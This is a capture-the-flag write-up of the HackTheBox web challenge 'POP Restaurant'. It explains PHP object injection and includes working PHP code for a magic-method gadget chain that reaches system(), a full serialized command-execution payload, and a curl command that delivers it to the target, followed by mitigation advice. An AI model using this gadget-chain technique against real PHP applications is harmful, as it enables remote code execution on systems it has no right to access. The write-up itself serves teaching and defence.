# POP Restaurant - HackTheBox CTF Write-up

## Challenge Information
- **Platform**: HackTheBox
- **Challenge**: POP Restaurant
- **Difficulty**: Easy
- **Category**: Web
- **Points**: 30

## Overview

POP Restaurant is a web challenge that exploits PHP Object Injection vulnerabilities through insecure deserialization. The challenge involves chaining multiple PHP magic methods to achieve remote code execution.

## Initial Reconnaissance

Upon accessing the web application, I encountered a food ordering system with login and registration functionality. After creating an account and logging in, I was presented with an order page where users can order Pizza, Spaghetti, or Ice Cream.

### Understanding the Vulnerability

When placing an order, I intercepted the request and noticed that the application uses serialized PHP objects encoded in base64:
```
POST /order.php
data=TzozOiJQaXp6YSI6Mzp7czo1OiJwcmljZSI7TjtzOjY6ImNoZWVzZSI7TjtzOjQ6InNpemUiO047fQ==
```

Decoding the base64 string revealed:
```
O:5:"Pizza":3:{s:5:"price";N;s:6:"cheese";N;s:4:"size";N;}
```

This indicates the application is vulnerable to PHP Object Injection.

## Source Code Analysis

Examining the provided source code, I identified three main classes with exploitable magic methods:

### Pizza Class
```php
class Pizza {
    public $price;
    public $cheese;
    public $size;

    public function __destruct() {
        echo $this->size->what;
    }
}
```

The `__destruct()` method is automatically called when the object is destroyed, attempting to access the `what` property of the `$size` object.

### Spaghetti Class
```php
class Spaghetti {
    public $sauce;
    public $noodles;
    public $portion;

    public function __get($tomato) {
        ($this->sauce)();
    }
}
```

The `__get()` magic method is invoked when accessing an inaccessible or non-existent property. It calls `$sauce` as a function.

### IceCream Class
```php
class IceCream {
    public $flavors;
    public $topping;

    public function __invoke() {
        foreach ($this->flavors as $flavor) {
            echo $flavor;
        }
    }
}
```

The `__invoke()` method allows the object to be called as a function, iterating through the `$flavors` array.

### ArrayHelpers Class
```php
namespace Helpers;
use \ArrayIterator;

class ArrayHelpers extends ArrayIterator {
    public $callback;

    public function current() {
        $value = parent::current();
        $debug = call_user_func($this->callback, $value);
        return $value;
    }
}
```

This class extends ArrayIterator and uses `call_user_func()` to execute a callback function on each array element.

## Exploitation Strategy

The exploitation chain works as follows:

1. **Pizza::__destruct()** is triggered when the Pizza object is destroyed
2. It accesses `$this->size->what`, where `$size` is a Spaghetti object
3. Since `what` doesn't exist in Spaghetti, **Spaghetti::__get()** is triggered
4. This calls `$this->sauce()` as a function, where `$sauce` is an IceCream object
5. **IceCream::__invoke()** is triggered, iterating through `$flavors`
6. `$flavors` contains an ArrayHelpers object that executes system commands

## Crafting the Payload

First, I needed to locate the flag file:
```php
$ArrayHelpers = new Helpers\ArrayHelpers(['ls -la /']);
$ArrayHelpers->callback = 'system';

$IceCream = new IceCream();
$IceCream->flavors = $ArrayHelpers;

$Spaghetti = new Spaghetti();
$Spaghetti->sauce = $IceCream;

$Pizza = new Pizza();
$Pizza->size = $Spaghetti;

echo base64_encode(serialize($Pizza));
```

This revealed the flag file location: `/pBhfMBQlu9uT_flag.txt`

## Getting the Flag

I modified the payload to read the flag:
```php
$ArrayHelpers = new Helpers\ArrayHelpers(['cat /pBhfMBQlu9uT_flag.txt']);
$ArrayHelpers->callback = 'system';

$IceCream = new IceCream();
$IceCream->flavors = $ArrayHelpers;

$Spaghetti = new Spaghetti();
$Spaghetti->sauce = $IceCream;

$Pizza = new Pizza();
$Pizza->size = $Spaghetti;

echo base64_encode(serialize($Pizza));
```

The serialized payload:
```
O:5:"Pizza":3:{s:5:"price";N;s:6:"cheese";N;s:4:"size";O:9:"Spaghetti":3:{s:5:"sauce";O:8:"IceCream":2:{s:7:"flavors";O:21:"\Helpers\ArrayHelpers":4:{i:0;i:0;i:1;a:1:{i:0;s:26:"cat /pBhfMBQlu9uT_flag.txt";}i:2;a:1:{s:8:"callback";s:6:"system";}i:3;N;}s:7:"topping";N;}s:7:"noodles";N;s:7:"portion";N;}}
```

Sending this payload to the server:
```bash
curl -i --raw "http://TARGET_IP:PORT/order.php" \
  -H "Cookie: PHPSESSID=YOUR_SESSION_ID" \
  -d "data=$(echo -n 'PAYLOAD' | base64)"
```

The server executed the command and returned the flag.

## Key Takeaways

- PHP Object Injection occurs when user-controlled data is passed to `unserialize()`
- Magic methods (`__destruct`, `__get`, `__invoke`) can be chained to create a POP (Property-Oriented Programming) chain
- Always validate and sanitize user input before deserialization
- Never deserialize data from untrusted sources
- The namespace prefix `\Helpers\` was crucial for correctly referencing the ArrayHelpers class

## Mitigation

To prevent this vulnerability:
- Avoid using `unserialize()` on user-controlled data
- Use safer alternatives like JSON for data serialization
- Implement input validation and integrity checks
- Use PHP's `allowed_classes` option when deserialization is necessary
